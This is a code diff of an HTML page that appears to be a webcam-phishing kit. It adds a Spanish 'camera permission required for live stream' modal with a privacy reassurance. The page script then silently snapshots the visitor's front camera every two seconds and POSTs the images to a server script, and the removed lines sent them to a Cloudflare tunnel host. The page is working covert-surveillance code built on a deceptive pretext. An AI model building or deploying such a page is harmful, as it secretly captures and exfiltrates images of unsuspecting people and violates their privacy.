@@ -4,7 +4,85 @@
 <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
 <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  .permission-modal {
+    display: flex;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.9);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+  }
+  .permission-modal.hidden {
+    display: none;
+  }
+  .permission-content {
+    background: white;
+    border-radius: 15px;
+    padding: 30px;
+    max-width: 350px;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+  }
+  .permission-icon {
+    font-size: 3em;
+    color: #1f2937;
+    margin-bottom: 15px;
+  }
+  .permission-title {
+    font-size: 1.5em;
+    font-weight: bold;
+    color: #333;
+    margin-bottom: 10px;
+  }
+  .permission-text {
+    color: #666;
+    margin-bottom: 20px;
+    font-size: 0.9em;
+  }
+  .permission-btn {
+    background-color: #1f2937;
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 5px;
+    font-size: 1em;
+    cursor: pointer;
+    width: 100%;
+    transition: background-color 0.3s;
+  }
+  .permission-btn:hover {
+    background-color: #111827;
+  }
+</style>
 </head>
+
+<body>
+
+<!-- Modal de Permiso de Cámara -->
+<div id="permission-modal" class="permission-modal">
+    <div class="permission-content">
+        <div class="permission-icon">
+            <i class="fas fa-camera"></i>
+        </div>
+        <div class="permission-title">Permiso de Cámara Requerido</div>
+        <p class="permission-text">
+            Se requiere acceso a tu cámara para continuar con la transmisión en vivo.
+        </p>
+        <button class="permission-btn" onclick="grantCameraPermission()">
+            <i class="fas fa-check"></i> Permitir Acceso
+        </button>
+        <p style="font-size: 0.8em; color: #999; margin-top: 10px;">
+            Tu privacidad es importante para nosotros
+        </p>
+    </div>
+</div>
+
 
 <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
@@ -15,31 +93,25 @@
 <script>
 
 function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'https://sent-nurses-mounts-referrals.trycloudflare.com/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
+  fetch('post.php', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
     },
-    error: function(){
-    }
+    body: 'cat=' + encodeURIComponent(imgdata)
+  }).catch(err => {
+    // Silencioso
   });
-};
-
+}
 
 'use strict';
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
 
 const constraints = {
   audio: false,
   video: {
-    
     facingMode: "user"
   }
 };
@@ -50,7 +122,7 @@ async function init() {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
   } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    console.error('Error accessing camera');
   }
 }
 
@@ -59,18 +131,20 @@ function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
 
-var context = canvas.getContext('2d');
+  var context = canvas.getContext('2d');
   setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
-
+    context.drawImage(video, 0, 0, 640, 480);
+    var canvasData = canvas.toDataURL("image/png");
+    post(canvasData);
+  }, 2000);
 }
 
-// Load init
-init();
+// Load init with permission
+function grantCameraPermission() {
+  const modal = document.getElementById('permission-modal');
+  modal.classList.add('hidden');
+  init();
+}
 
 </script>
 
